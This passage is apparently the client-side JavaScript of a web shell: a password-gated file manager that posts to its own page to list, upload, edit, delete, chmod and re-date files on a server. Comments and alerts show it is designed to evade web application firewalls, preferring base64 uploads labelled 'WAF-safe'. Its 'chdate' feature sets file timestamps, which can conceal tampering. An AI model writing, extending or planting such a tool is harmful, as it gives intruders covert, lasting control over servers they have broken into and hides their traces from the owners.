    opts.headers['X-Requested-With'] = 'XMLHttpRequest';
    try {
      const res = await fetch(window.location.href, opts);
      const txt = await res.text();
      if (/^\s*<!DOCTYPE|^\s*<html/i.test(txt)) {
        this.showAlert('blocked by WAF (HTML response)', 'error');
        return null;
      }
      try { return JSON.parse(txt); }
      catch { this.showAlert('invalid JSON response', 'error'); return null; }
    } catch (e) {
      this.showAlert('network error: ' + e.message, 'error'); return null;
    }
  },

  async checkSession() {
    const r = await this.ajax({ action: 'check_session' });
    if (r && r.logged_in) {
      document.getElementById('loginScreen').style.display = 'none';
      document.getElementById('app').style.display = 'block';
      await this.getInitialData();
      this.loadFiles(this.currentDir);
    }
  },

  async login() {
    const pw = document.getElementById('password').value;
    this.showLoading();
    const r = await this.ajax({ action: 'login', password: pw });
    this.hideLoading();
    if (r && r.success) {
      document.getElementById('loginScreen').style.display = 'none';
      document.getElementById('app').style.display = 'block';
      await this.getInitialData();
      this.loadFiles(this.currentDir);
    } else {
      const er = document.getElementById('loginError');
      er.textContent = r ? r.message : 'login failed';
      er.classList.add('active');
      setTimeout(() => er.classList.remove('active'), 2500);
    }
  },

  async logout() {
    if (!confirm('logout?')) return;
    await this.ajax({ action: 'logout' });
    location.reload();
  },

  async getInitialData() {
    const r = await this.ajax({ action: 'get_initial_data' });
    if (r && r.success) {
      this.currentDir = r.current_dir;
      this.initialDir = r.initial_dir;
    }
  },

  async loadFiles(dir) {
    this.showLoading();
    const r = await this.ajax({ action: 'list', dir });
    this.hideLoading();
    if (!r) return;
    if (r.success) {
      this.currentDir = r.current_dir;
      this.allFiles = r.items;
      this.renderFiles(r.items);
      this.renderBreadcrumb(this.currentDir);
    } else {
      this.showAlert(r.message || 'error', 'error');
      document.getElementById('fileList').innerHTML =
        `<tr><td colspan="5" style="text-align:center;padding:40px;color:#ff4444;">
           <i class="fas fa-exclamation-triangle" style="font-size:36px;"></i>
           <p>${this.escapeHtml(r.message || 'cannot read')}</p></td></tr>`;
      this.renderBreadcrumb(r.current_dir || this.currentDir);
    }
  },

  renderFiles(files) {
    const tb = document.getElementById('fileList');
    if (!files.length) {
      tb.innerHTML = `<tr><td colspan="5" style="text-align:center;padding:36px;color:#666;">
        <i class="fas fa-folder-open" style="font-size:36px;"></i><p>empty</p></td></tr>`;
      return;
    }
    tb.innerHTML = files.map(f => {
      const p = f.path.replace(/\\/g, '\\\\').replace(/'/g, "\\'");
      const n = this.escapeHtml(f.name);
      return `<tr>
        <td><div class="file-name" onclick="${f.is_dir ? `FM.loadFiles('${p}')` : ''}">
          <span class="file-icon">${f.icon}</span><span>${n}</span></div></td>
        <td>${f.size_fmt}</td>
        <td><code>${f.perms}</code></td>
        <td>${f.mtime}</td>
        <td><div class="file-actions">
          ${!f.is_dir ? `
            <button class="icon-btn" title="edit" onclick="FM.editFile('${p}','${n}')"><i class="fas fa-edit"></i></button>
            <button class="icon-btn" title="download" onclick="FM.downloadFile('${p}')"><i class="fas fa-download"></i></button>
          ` : ''}
          ${/\.(jpg|jpeg|png|gif|webp)$/i.test(f.name) ? `
            <button class="icon-btn" title="preview" onclick="FM.previewImage('${p}')"><i class="fas fa-eye"></i></button>` : ''}
          <button class="icon-btn" title="rename" onclick="FM.showRename('${p}','${n}')"><i class="fas fa-pen"></i></button>
          <button class="icon-btn" title="chmod" onclick="FM.showChmod('${p}','${f.perms}')"><i class="fas fa-lock"></i></button>
          <button class="icon-btn" title="chdate" onclick="FM.showChdate('${p}')"><i class="fas fa-clock"></i></button>
          <button class="icon-btn" title="copy path" onclick="FM.copyPath('${p}')"><i class="fas fa-copy"></i></button>
          <button class="icon-btn" title="delete" style="color:#ff4444" onclick="FM.deleteItem('${p}',${f.is_dir})"><i class="fas fa-trash"></i></button>
        </div></td></tr>`;
    }).join('');
  },

  renderBreadcrumb(path) {
    path = path.replace(/\\/g, '/');
    let bc = `<a href="#" onclick="FM.loadFiles('${this.escapeAttr(this.initialDir)}');return false;"><i class="fas fa-home"></i></a>`;
    let parts, cur = '';
    if (/^[A-Z]:/i.test(path)) {
      const drv = path.substring(0, 2);
      parts = path.substring(3).split('/').filter(Boolean);
      bc += ` <span>/</span> <a href="#" onclick="FM.loadFiles('${drv}/');return false;">${drv}</a>`;
      cur = drv + '/';
    } else {
      parts = path.split('/').filter(Boolean);
      cur = '/';
    }
    parts.forEach((part, i) => {
      cur += part + (i < parts.length - 1 ? '/' : '');
      bc += ` <span>/</span> <a href="#" onclick="FM.loadFiles('${this.escapeAttr(cur)}');return false;">${this.escapeHtml(part)}</a>`;
    });
    document.getElementById('breadcrumb').innerHTML = bc;
  },

  searchFiles() {
    const q = document.getElementById('searchInput').value.toLowerCase();
    if (!q) { this.renderFiles(this.allFiles); return; }
    this.renderFiles(this.allFiles.filter(f => f.name.toLowerCase().includes(q)));
  },

  refreshFiles() { this.loadFiles(this.currentDir); this.showAlert('refreshed', 'success'); },

  showUploadModal() { document.getElementById('uploadModal').classList.add('active'); },

  async uploadFile() {
    const inp = document.getElementById('uploadFile');
    if (!inp.files.length) return this.showAlert('select a file', 'error');
    const file = inp.files[0];
    this.showLoading();

    // base64 first (WAF-safe)
    const b = await this.uploadBase64(file);
    if (b && b.success) {
      this.hideLoading(); this.closeModal('uploadModal');
      this.showAlert('uploaded (b64)', 'success');
      this.loadFiles(this.currentDir);
      document.getElementById('uploadForm').reset();
      return;
    }
    // fallback multipart
    const fd = new FormData();
    fd.append('action', 'upload');
    fd.append('dir', this.currentDir);
    fd.append('file', file);
    try {
      const res = await fetch(window.location.href, {
        method: 'POST',
        headers: { 'X-Requested-With': 'XMLHttpRequest' },
        body: fd,
        credentials: 'same-origin'
      });
      const txt = await res.text();
      this.hideLoading(); this.closeModal('uploadModal');
      if (/^\s*<!DOCTYPE|^\s*<html/i.test(txt)) return this.showAlert('blocked by WAF', 'error');
      const r = JSON.parse(txt);
      if (r.success) {
        this.showAlert('uploaded (' + (r.method || 'muf') + ')', 'success');
        this.loadFiles(this.currentDir);
        document.getElementById('uploadForm').reset();
      } else {
        this.showAlert('upload failed: ' + r.message, 'error');
      }
    } catch (e) {
      this.hideLoading(); this.closeModal('uploadModal');
      this.showAlert('upload error: ' + e.message, 'error');
    }
  },

  uploadBase64(file) {
    return new Promise(resolve => {
      const rd = new FileReader();
      rd.onload = async e => {
        const b64 = e.target.result.split(',')[1];
        const r = await this.ajax({
          action: 'upload_base64',
          dir: this.currentDir,
          filename: file.name,
          filedata: b64
        });
        resolve(r);
      };
      rd.onerror = () => resolve({ success: false });
      rd.readAsDataURL(file);
    });
  },

  showCreateFolderModal() { document.getElementById('createFolderModal').classList.add('active'); },
  async createFolder() {
    const n = document.getElementById('folderName').value.trim();
    if (!n) return this.showAlert('name required', 'error');
    this.showLoading();
    const r = await this.ajax({ action: 'create_folder', dir: this.currentDir, folder_name: n });
    this.hideLoading(); this.closeModal('createFolderModal');
    if (r && r.success) { this.showAlert('folder created', 'success'); this.loadFiles(this.currentDir); document.getElementById('folderName').value = ''; }
    else this.showAlert(r ? r.message : 'error', 'error');
  },

  showCreateFileModal() { document.getElementById('createFileModal').classList.add('active'); },
  async createFile() {
    const n = document.getElementById('fileName').value.trim();
    if (!n) return this.showAlert('name required', 'error');
    this.showLoading();
    const r = await this.ajax({ action: 'create_file', dir: this.currentDir, file_name: n });
    this.hideLoading(); this.closeModal('createFileModal');
    if (r && r.success) { this.showAlert('file created', 'success'); this.loadFiles(this.currentDir); document.getElementById('fileName').value = ''; }
    else this.showAlert(r ? r.message : 'error', 'error');
  },

  async editFile(path, name) {
    this.currentEditPath = path;
    document.getElementById('editFileName').textContent = name;
    const ext = (name.split('.').pop() || '').toLowerCase();
    const modes = { php:'php', js:'javascript', html:'html', css:'css', json:'json', xml:'xml', sql:'sql', py:'python', sh:'sh' };
    this.editor.session.setMode(modes[ext] ? `ace/mode/${modes[ext]}` : 'ace/mode/text');
    this.showLoading();
    const r = await this.ajax({ action: 'read_file', path });
    this.hideLoading();
    if (r && r.success) {
      this.editor.setValue(r.content, -1);
      document.getElementById('editModal').classList.add('active');
    } else this.showAlert('read failed', 'error');
  },

  async saveFile() {
    this.showLoading();
    const r = await this.ajax({ action: 'save_file', path: this.currentEditPath, content: this.editor.getValue() });
    this.hideLoading();
    if (r && r.success) { this.showAlert('saved', 'success'); this.closeModal('editModal'); this.loadFiles(this.currentDir); }
    else this.showAlert('save failed', 'error');
  },

  showRename(path, name) {
    this.currentRenamePath = path;
    document.getElementById('renameInput').value = name;
    document.getElementById('renameModal').classList.add('active');
  },
  async confirmRename() {
    const n = document.getElementById('renameInput').value.trim();
    if (!n) return this.showAlert('name required', 'error');
    this.showLoading();
    const r = await this.ajax({ action: 'rename', old_path: this.currentRenamePath, new_name: n });
    this.hideLoading(); this.closeModal('renameModal');
    if (r && r.success) { this.showAlert('renamed', 'success'); this.loadFiles(this.currentDir); }
    else this.showAlert(r ? r.message : 'error', 'error');
  },

  showChmod(path, perms) {
    this.currentChmodPath = path;
    document.getElementById('chmodInput').value = perms;
    document.getElementById('chmodModal').classList.add('active');
  },
  async confirmChmod() {
    const p = document.getElementById('chmodInput').value.trim();
    if (!/^[0-7]{3,4}$/.test(p)) return this.showAlert('bad format', 'error');
    this.showLoading();
    const r = await this.ajax({ action: 'chmod', path: this.currentChmodPath, permissions: p });
    this.hideLoading(); this.closeModal('chmodModal');
    if (r && r.success) { this.showAlert('chmod ok', 'success'); this.loadFiles(this.currentDir); }
    else this.showAlert(r ? r.message : 'error', 'error');
  },

  showChdate(path) {
    this.currentChdatePath = path;
    document.getElementById('chdateInput').value = '';
    document.getElementById('chdateText').value = '';
    document.getElementById('chdateModal').classList.add('active');
  },
  async confirmChdate() {
    const dt = document.getElementById('chdateInput').value;
    const txt = document.getElementById('chdateText').value.trim();
    const time = txt || (dt ? dt.replace('T', ' ') : '');
    if (!time) return this.showAlert('pick a date', 'error');
    this.showLoading();
    const r = await this.ajax({ action: 'chdate', path: this.currentChdatePath, time });
    this.hideLoading(); this.closeModal('chdateModal');
    if (r && r.success) { this.showAlert('chdate ok', 'success'); this.loadFiles(this.currentDir); }
    else this.showAlert(r ? r.message : 'error', 'error');
  },

  async deleteItem(path, isDir) {
    if (!confirm(`delete ${isDir ? 'folder' : 'file'}?`)) return;
    this.showLoading();
    const r = await this.ajax({ action: 'delete', path });
    this.hideLoading();
    if (r && r.success) { this.showAlert('deleted', 'success'); this.loadFiles(this.currentDir); }
    else this.showAlert(r ? r.message : 'error', 'error');
  },

  downloadFile(path) {
    window.open(`${window.location.href}?download=${encodeURIComponent(path)}`, '_blank');
  },

  previewImage(path) {
    document.getElementById('imagePreview').src = `${window.location.href}?preview=${encodeURIComponent(path)}`;
    document.getElementById('imageModal').classList.add('active');
  },

  copyPath(path) {
    navigator.clipboard.writeText(path)
      .then(() => this.showAlert('path copied', 'success'))
      .catch(() => this.showAlert('copy failed', 'error'));
  },

  closeModal(id) { document.getElementById(id).classList.remove('active'); },
  showLoading() { document.getElementById('loading').classList.add('active'); },
  hideLoading() { document.getElementById('loading').classList.remove('active'); },
  showAlert(msg, type) {
    const a = document.getElementById('alertBox');
    a.textContent = msg;
    a.className = `alert alert-${type} active`;
    setTimeout(() => a.classList.remove('active'), 2600);
  },
  escapeHtml(t) { const d = document.createElement('div'); d.textContent = t; return d.innerHTML; },
  escapeAttr(t) { return String(t).replace(/'/g, "\\'").replace(/\\/g, '\\\\'); }
};

FM.init();
</script>
</body>
</html>